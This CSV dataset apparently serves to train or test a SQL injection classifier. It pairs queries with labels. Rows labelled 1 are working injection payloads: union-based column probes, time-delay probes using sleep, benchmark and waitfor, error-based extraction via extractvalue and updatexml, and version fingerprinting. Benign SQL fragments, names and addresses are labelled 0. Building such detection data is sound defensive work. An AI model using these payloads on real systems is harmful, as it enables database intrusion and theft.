Query,Label
"1, ( select ( case when ( 8640 = 8640 ) then ( ascii ( regexp_substring ( repeat ( right ( char ( 8640 ) ,0 ) ,500000000 ) ,null ) ) ) else 8640/ ( select 0 from information_schema.system_users ) end ) from information_schema.system_users ) --",1
1' ) as qqyz where 2274 = 2274,1
"-4076' ) ) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",1
"SELECT * FROM compass ORDER BY jungle ASC, therefore DESC",0
-1621' in boolean mode ) order by 1--,1
1'|| ( select 'lxyu' from dual where 5789 = 5789 union all select null#,1
"1' and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( '%' = '",1
1 ) and 9198 = 9198--,1
1' ) and ( 3020 = 3020 ) *6703,1
diana,0
"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( '%' = '",1
"SELECT * FROM around ORDER BY popular ASC, than DESC",0
-1393' ) ) ) union all select 8280--,1
"1' ) ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( ( 'zizo' like 'zizo",1
SELECT * FROM ( SELECT oxygen FROM shells ),0
"SELECT * FROM blank ORDER BY label, engine",0
"1' where 3339 = 3339 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1
"SELECT left, command, respect FROM sail WHERE worried IS NULL",0
DELETE FROM room,0
ejerci78,0
1' ) as cdrm where 4595 = 4595 order by 1#,1
"c/ fuente 28,",0
SELECT * FROM letter WHERE too BETWEEN 'slabs' AND 'ten',0
-2411%' ) ) ) or 6872 = 6872 and ( ( ( '%' = ',1
"1"" ) as zbhs where 2017 = 2017 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1
"SELECT Employees.vowel, COUNT ( Orders.batID ) AS engineFROM ( OrdersINNER JOIN beauty ON Orders.tillID = Employees.pitchID )",0
torre-cardela,0
"-2896' ) ) as wisk where 1030 = 1030 union all select 1030,1030,1030,1030#",1
1 ) ) union all select null#,1
"1'|| ( select 'ukfj' where 7133 = 7133 union all select null,null,null#",1
"-5859 ) as ernq where 8394 = 8394 union all select 8394,8394,8394--",1
"1 ) where 8164 = 8164 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"1 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
DELETE FROM discuss WHERE cook = 'basic',0
-9660 ) ) or 9762 = 9698,1
pearce,0
1' ) where 9272 = 9272,1
yoel,0
"-7329"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""borw"" like ""borw",1
severiano,0
10410049l,0
"-1998' ) as kgvf where 2346 = 2346 union all select 2346,2346,2346,2346,2346,2346,2346,2346,2346--",1
"select * from users where id = 1 or ""%."" or 1 = 1 -- 1",1
1' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'mmfq' = 'mmfq,1
SELECT * FROM book FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM onto,0
SELECT total ( s ) FROM upper SELECT high FROM which,0
alguer murillo,0
"1"" where 9792 = 9792 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1
96277205x,0
1 ) rlike ( select ( case when ( 5477 = 7492 ) then 1 else 0x28 end ) ) and ( 4427 = 4427,1
"SELECT low,bound,develop,kill,older ( ( string JOIN beyond ON youth.speed = studying.bend ) INNER JOIN masterON Orders.feel = greatly.trackID )",0
"-4340 ) ) or make_set ( 9354 = 9354,7185 ) and ( ( 8505 = 8505",1
talonera,0
"SELECT railroad,well,stove,policeman,level ( ( source JOIN muscle ON eventually.citizen = library.sense ) INNER JOIN willingON Orders.danger = away.compositionID )",0
90946866j,0
"-8599 ) ) or elt ( 5628 = 2324,2324 ) and ( ( 1134 = 1134",1
or 3 = 3,1
"1' ) and elt ( 4249 = 4249,7259 )",1
SELECT * FROM chosen,0
"-9566%"" ) union all select 7973,7973,7973,7973--",1
"SELECT * FROM until WHERE been BETWEEN ""private"" AND ""piece""",0
SELECT trail FROM tie,0
"select * from users where id = '1' union select \.#,@@VERSION -- 1'",1
2er7n9um43a,0
"1' ) ) as clhk where 4607 = 4607 or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) --",1
1 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # odvp,1
1'+ ( select 'jkgf' where 7487 = 7487,1
18898337l,0
21924971z,0
SELECT * FROM orbit WHERE popular = 'not' LIMIT 3,0
borzani jordan,0
abagail,0
burgoa planells,0
1 ) ) ) and 8990 = 4775 and ( ( ( 1894 = 1894,1
"1"" ) as hblk where 7982 = 7982 and 9611 = 6142--",1
SELECT * FROM ( SELECT conversation FROM pick ),0
SELECT * FROM clear WHERE Price NOT BETWEEN 10 AND 20,0
SELECT * FROM Customers,0
parke antonio trueba 175,0
"1"" ) ) as maxe where 5883 = 5883 union all select null,null,null,null,null,null,null,null,null#",1
1 ) ) as uvep where 6016 = 6016 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1
3.35E+15,0
"-7627%"" ) ) union all select 4011,4011,4011,4011,4011,4011,4011,4011,4011,4011--",1
"SELECT column_name ( s ) FROM swung,uncle",0
bjorn,0
SELECT * FROM offer WHERE ancient = 'thin' OR bear = 'basket',0
-3100' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 'etuj' like 'etuj,1
1 ) union all select null#,1
"UPDATE newspaper SET wherever = 'unit', City = 'captured' WHERE went = slight",0
"SELECT planetID AS ID, grew AS knew FROM ranch",0
SELECT * FROM hearing,0
1'+ ( select 'yhcf' where 8367 = 8367,1
"select * from users where id = 1 or ""$["" or 1 = 1 -- 1",1
SELECT * FROM bush WHERE enter = 'hundred' OR coming = 'mud',0
1' ) where 3187 = 3187 order by 1#,1
96110955g,0
"SELECT CustomerID AS ID, CustomerName AS Customer FROM Customers;",0
"SELECT STRCMP ( ""SQL Tutorial"", ""SQL Tutorial"" ) ;",0
"1"" ) ) and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""kpwc"" like ""kpwc",1
SELECT * FROM ocean 3,0
"1"" ) ) as whyr where 9731 = 9731 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --",1
"1%"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1
SELECT * FROM country FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM section,0
"SELECT salt, lunch, atmosphereFROM bag WHERE yourself IS NOT NULL",0
1 ) ) and 2006 = 2006,1
SELECT clearly ( s ) FROM naturally FULL OUTER JOIN,0
select sleep ( 5 ) and ( 'pwpc' = 'pwpc,1
"1"" ) ) as gbxx where 2459 = 2459 waitfor delay '0:0:5'--",1
"1"" where 4294 = 4294 and make_set ( 2543 = 7988,7988 ) --",1
"-8888%' ) union all select 5312,5312,5312,5312,5312,5312,5312,5312--",1
end and ( 'rlux' like 'rlux,1
"1 ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 8382 = 8382",1
1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'pziy' = 'pziy,1
"1"" where 5477 = 5477",1
1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 3530 = 3530,1
"1 where 7642 = 7642 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1
"1%' ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",1
5719,0
balitear,0
SELECT AVG ( won ) FROM foreign,0
"-5591%"" ) ) order by 1--",1
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) )",1
"INSERT INTO belong ( route, collect, desert, bowl, smooth, threw ) VALUES ( 'spread', 'weigh'. forty', 'fear', 'loss', 'apartment', 'studied' )",0
SELECT * FROM Customers WHERE NOT Country = 'Germany';,0
SELECT * FROM happened WHERE carefully BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT AVG ( week ) FROM against SELECT SUM ( mouse ),0
ayoroa,0
SELECT * FROM ( SELECT original FROM wall ),0
regueras de arriba,0
"SELECT CustomerID AS ID, CustomerName AS Customer FROM Customers;",0
conceptear,0
31153,0
"-1630' union all select 1971,1971--",1
SELECT * FROM add WHERE wealth BETWEEN '1996-07-01' AND '1996-07-31',0
||'6,1
SELECT * FROM tone WHERE Price NOT BETWEEN 10 AND 20,0
SELECT TOP 3 * FROM own WHERE individual = 'worse' SELECT * FROM from,0
DELETE FROM basic,0
"-1244 ) as qszw where 2332 = 2332 union all select 2332,2332,2332,2332#",1
"SELECT * FROM floor ORDER BY useful, general",0
"SELECT * FROM directly WHERE hard NOT IN ( 'lucky', 'bottom', 'earth' )",0
select * from users where id = 1 or ( $+ ) = 1 or 1 = 1 -- 1,1
SELECT * FROM city FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT frog,0
SELECT * FROM bit WHERE voice = 'golden' FETCH FIRST 3 ROWS ONLY,0
"( convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 9339 = 9339 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) )",1
gambs galatioto,0
UPDATE motor SET traffic = 'tobacco'WHERE east = 'species',0
"1"" ) where 9511 = 9511 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",1
dormer,0
SELECT air ( s ) FROM traffic,0
"-9848' union all select 1359,1359,1359,1359,1359,1359,1359,1359,1359,1359--",1
"passatge badal, 31,",0
9.03287E+15,0
5a4a84e8a,0
"SELECT catID AS ID, football AS held FROM plates",0
SELECT COUNT ( wise ) FROM draw,0
select ( case when ( 6652 = 1932 ) then 6652 else 6652* ( select 6652 from information_schema.character_sets ) end ) #,1
8485,0
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'dthp' = 'dthp",1
-5470' ) ) or ( 8459 = 8459 ) *4906 and ( ( 'oeam' = 'oeam,1
"-6971"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""ifuh"" like ""ifuh",1
"1'|| ( select 'osux' from dual where 7066 = 7066 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ) ||'",1
SELECT * FROM mud FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM second,0
SELECT * FROM label WHERE whether = 'uncle' FETCH FIRST 3 ROWS ONLY,0
select case when 9390 = 5752 then 1 else null end--,1
-9405' union all select 2539--,1
1'|| ( select 'bifa' where 6077 = 6077 and 4547 = 9301,1
"select * from users where id = 1 union select @<@,version ( ) -- 1",1
"select * from users where id = 1 + ( $+ ) union select null,@@VERSION -- 1",1
"1"" ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",1
"1"" ) as ifgl where 2190 = 2190 rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) --",1
"iif ( 2840 = 3788,1,1/0 )",1
"1' in boolean mode ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) #",1
cercs,0
6703,0
DELETE FROM solution,0
SELECT * FROM quick WHERE essential = 'grabbed' LIMIT 3,0
xaudiera alicea,0
48549953n,0
SELECT * FROM recently 3 SELECT * FROM excellent,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual",1
"INSERT INTO sudden ( anybody, turn, faster, replace, tune, rose ) VALUES ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )",0
"select * from users where id = 1 + ( 1 ) union select null,banner from v$version where rownum = 1 -- 1",1
SELECT COUNT ( DISTINCT father ) FROM castle,0
1%' ) waitfor delay '0:0:5' and ( '%' = ',1
10817,0
"1%"" ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""%"" = """,1
SELECT MIN ( it ) AS pitch FROM dinner,0
"c/ torre, 151, 9?b",0
rob,0
"1 ) where 1559 = 1559 or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) --",1
"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'wjwn' = 'wjwn",1
azcrate campalan,0
"-7749"" or ( 2689 = 7481 ) *7481",1
"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'jjmt' = 'jjmt",1
1' ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ),1
47639,0
"1%"" ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( ""%"" = """,1
"-9672' ) ) as rupb where 8218 = 8218 or make_set ( 4954 = 1836,1836 ) --",1
"SELECT sound, pleasure, you FROM surface WHERE strength IS NULL",0
1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- izad,1
"-1543%' union all select 9341,9341,9341,9341,9341,9341,9341,9341,9341--",1
"1%' ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( '%' = '",1
"INSERT INTO vote ( flat, trap, card, score, correctly, law ) VALUES ( 'market', 'chose'. zero', 'within', 'gas', 'waste', 'screen' )",0
61877469v,0
"SELECT * FROM plastic WHERE rich BETWEEN ""low"" AND ""aloud""",0
SELECT * FROM proud 3,0
SELECT AVG ( corner ) FROM whose SELECT SUM ( unusual ),0
"-8771"" ) ) union all select 6302,6302,6302,6302,6302#",1
monsalve almada,0
8a86ra7,0
"-5078 union all select 9708,9708--",1
"1"" and make_set ( 4214 = 9503,9503 ) and ""phjg"" like ""phjg",1
 or 1 = 1 --,1
"1' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and 'raru' = 'raru",1
"SELECT Orders.OrderID, Customers.CustomerName FROM Orders INNER JOIN Customers ON Orders.CustomerID = Customers.CustomerID;",0
SELECT * FROM ran WHERE Price NOT BETWEEN 10 AND 20,0
"1%' ) union all select null,null,null,null,null,null,null#",1
1 ) ) ) and 9575 = 1640--,1
"1"" ) as mwja where 7881 = 7881 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1
"1"" ) where 2367 = 2367",1
"1"" ) as dien where 4022 = 4022",1
"1' ) ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1
"romana, la",0
cesarin,0
if ( 8284 = 6171 ) select 8284 else drop function mbih--,1
SELECT * FROM rope WHERE making = 'spring' LIMIT 3,0
"-1707 ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 7756 = 7756",1
SELECT * FROM master FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM chair,0
1 where 8180 = 8180 or sleep ( 5 ) #,1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN ( 28547 ) ORDER BY meta_id ASC",0
chalanera,0
SELECT * FROM garden,0
wilde@casasdefamosos.zw,0
SELECT City FROM CustomersUNIONSELECT City FROM SuppliersORDER BY City;,0
"SELECT * FROM serious ORDER BY wrote ASC, spin DESC",0
"SELECT Employees.lot, COUNT ( Orders.industryID ) AS talesFROM ( OrdersINNER JOIN must ON Orders.equipmentID = Employees.stiffID )",0
modorrillo,0
DELETE FROM hill WHERE aboard = 'opposite',0
"1'|| ( select 'xyft' from dual where 8250 = 8250 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",1
"-7923"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ""szct"" = ""szct",1
gaianes,0
-6855' ) or 8519 = 9248,1
c/ rivera de los limonetes 98,0
SELECT * FROM list,0
1 where 7299 = 7299 rlike sleep ( 5 ) --,1
ch9let_a,0
"-3501' ) ) ) or make_set ( 7122 = 6158,6158 ) and ( ( ( 'mlfl' like 'mlfl",1
SELECT TOP 3 * FROM flag WHERE construction = 'congress' SELECT * FROM top,0
SELECT * FROM mine ORDER BY so,0
-2223' ) ) as mjwp where 8650 = 8650 or 7900 = 5838,1
"1'+ ( select 'cstd' where 9326 = 9326 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select ( elt ( 7982 = 7982,1 ) ) ) ,0x717a767a71 ) ) ) +'",1
SELECT * FROM that WHERE suddenly = connected,0
select case when 8514 = 3207 then 1 else null end--,1
"select sleep ( 5 ) and ""irxg"" = ""irxg",1
"INSERT INTO am ( ball, especially, fellow ) VALUES ( 'off', 'your', 'surrounded' )",0
select ( case when ( 6859 = 6507 ) then 6859 else 6859* ( select 6859 from mysql.db ) end ) #,1
"1%' ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"1' ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) and ( 'wdru' like 'wdru",1
"1 ) ) as qfnu where 1609 = 1609 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
3.14114E+15,0
7919,0
"-8144' ) where 1691 = 1691 or elt ( 7246 = 7816,7816 ) --",1
aineln,0
-9389' ) order by 1#,1
29142280s,0
10155328t,0
wardle,0
SELECT TOP 3 * FROM writer SELECT * FROM truth 3SELECT * FROM court,0
"-1722' union all select 1408,1408,1408#",1
"1"" union all select null#",1
SELECT * FROM area WHERE easily = 'wash',0
SELECT * FROM all WHERE solution = 'press' LIMIT 3,0
1' ) as sjij where 8659 = 8659,1
"1"" ) as doai where 7024 = 7024 union all select null,null,null,null,null,null,null,null--",1
"1"" ) as rnte where 6517 = 6517 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
"-8881%' union all select 8420,8420,8420,8420,8420,8420,8420#",1
"1 ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 8475 = 8475",1
surai,0
-8074' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'lnwm' = 'lnwm,1
"-5757%"" ) or 6872 = 6872 and ( ""%"" = """,1
"1'|| ( select 'scba' where 9079 = 9079 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1
SELECT CURRENT_TIMESTAMP ( ) + 1;,0
SELECT * FROM next FETCH FIRST 50 PERCENT ROWS ONLY,0
"-2605"" ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ""cikb"" like ""cikb",1
SELECT heading ( s ) FROM between INNER JOIN,0
-7041' ) where 6307 = 6307 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1
peng1in,0
1' ) ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( 'rgyc' = 'rgyc,1
select ( case when ( 9130 = 1826 ) then 9130 else 9130* ( select 9130 from mysql.db ) end ) #,1
lucila2,0
"1' where 1673 = 1673 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1
"travesia palacio 61, 1?d",0
dipscea,0
SELECT review ( s ) FROM powder UNION ALL,0
SELECT DISTINCT activity FROM tax,0
organizar,0
"SELECT strong, planned, massFROM trip WHERE paper IS NOT NULL",0
SELECT option_value FROM wp_options WHERE option_name = 'options_footer_button_3_link' LIMIT 1,0
SELECT AVG ( skill ) FROM tower SELECT SUM ( great ),0
77711232m,0
1'+ ( select pagd where 2484 = 2484,1
"-3865' ) union all select 4935,4935,4935,4935,4935--",1
elwes@enla.nu,0
-4965 ) as imga where 3705 = 3705 union all select 3705--,1
